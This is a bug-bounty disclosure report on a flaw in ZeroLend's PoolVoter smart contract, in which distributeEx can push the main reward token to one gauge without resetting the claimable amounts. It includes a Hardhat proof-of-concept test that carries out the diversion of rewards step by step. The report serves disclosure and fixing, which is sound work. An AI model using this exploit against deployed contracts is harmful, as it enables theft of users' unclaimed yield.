# 28955 - \[SC - High] Malicious user can transfer all unclaimed rewar...

Submitted on Mar 3rd 2024 at 01:16:07 UTC by @MahdiKarimi for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28955

Report type: Smart Contract

Report severity: High

Target: <https://github.com/zerolend/governance>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

A malicious user can distribute reward tokens to a specific pool gauge through distributeEx function at PoolVoter without resetting claimable mapping.

## Vulnerability Details

There are two distribute methods in PoolVoter. a distribute function, which is intended to transfer any claimable reward of a gauge and notifyRewardAmount in that gauge then reset claimable mapping , also there is a distributeEx function which is intended to distribute additional rewards proportionally to all gauges, it takes a rewards token address (a token that would be distributed ) and several pool addresses to distribute rewards, the distributed amount has been calculated based on pool weight proportion to the total weight. however, it doesn't check the token address provided as the parameter is not the main reward token, so the main reward token can be transferred through this function without resetting claimable mapping, which enables transferring more yield to a specific gauge, leading to a situation which contract doesn't have enough balance to distribute reward of other gauges. most rewards can transferred to a gauge to benefit the attacker.

## Impact Details

Malicious users can transfer more rewards to a gauge ( almost all rewards ), in favor of themselves, which is considered direct theft of unclaimed yields.

## References

<https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L214-L234> <https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/voter/PoolVoter.sol#L181-L190>

## Proof of Concept

```
describe("transfer rewards test", () => {
  it("Malicious user can transfer all rewards to a speciefic gauge", async function () {
  
  // NOTE: this test works with https://github.com/zerolend/governance/commit/4c18c037bd3360ec7316733478b67632fb5218c9 commit 
  // tests didn't work at latest commit, however there is no change at pool voter other than changing some variable names between two commits 
  // so there is no differece 
  // some parts has been added to deployement as follow
  // a new lending pool has been deployed during deployment and its gauge has been registered at pool voter during deployment 
  // some zero tokens has been transferred to ant.address, so ant.address have enough zero token balance 
  // there is an issue at line 136 of PoolVoter by missing a ! sign, which prevents adding pools to _pool array and preventing distribute rewards 
  // since this issue relates to distributing rewards I needed to fix that so distribute function works by fixing if statement 
  // however I submitted that issue seperately and its different from this issue 

  // voting to both gauges equally 
  let vote1 = 1e8/2;
  let vote2 = 1e8/2; 
  await poolVoter.connect(ant).vote([reserve.target, reserve2.target],[vote1, vote2]);
 
  // notify some zero token rewards to pool voter 
  await zero.connect(ant).approve(poolVoter.target, 1e6);
  await poolVoter.connect(ant).notifyRewardAmount(1e6);

  let gauge = poolVoter.gauges(reserve.target);
  let gauge2 = poolVoter.gauges(reserve2.target);

  // update status of both gauges 
  await poolVoter.updateFor(gauge);
  await poolVoter.updateFor(gauge2);

  // retrieve total claimable amount and pool voter contract balance 
  let totalClaimable = await poolVoter.claimable(gauge) + await poolVoter.claimable(gauge2);
  let balance = await zero.balanceOf(poolVoter);

  // ensure pool voter has enough balacne to distribute claimable rewards 
  expect(balance).greaterThanOrEqual(totalClaimable);

  // call distributeEx with zero token address to distribute rewards to first gauge without reseting its claimable mapping 
  await poolVoter["distributeEx(address,uint256,uint256)"](zero.target, 0,1);

  // retrieve total claimable and balance after distribution 
  let totalClaimableAfter = await poolVoter.claimable(gauge) + await poolVoter.claimable(gauge2);
  let balanceAfter = await zero.balanceOf(poolVoter);

  // currently balance is less than totalClaimable 
  // balance is decreased but totalClaimable has not been changed 
  // so there is not enough balance to cover distributing all rewards 
  expect(balanceAfter).lessThan(totalClaimableAfter);
  expect(balanceAfter).lessThan(balance);
  expect(totalClaimable).eq(totalClaimableAfter);

  // so we can claim rewards for first gauge again, transfering all rewards to first gauge and there is not balance to transfer reward of second gauge 
  await poolVoter["distribute(address)"](gauge);


  });
});
```
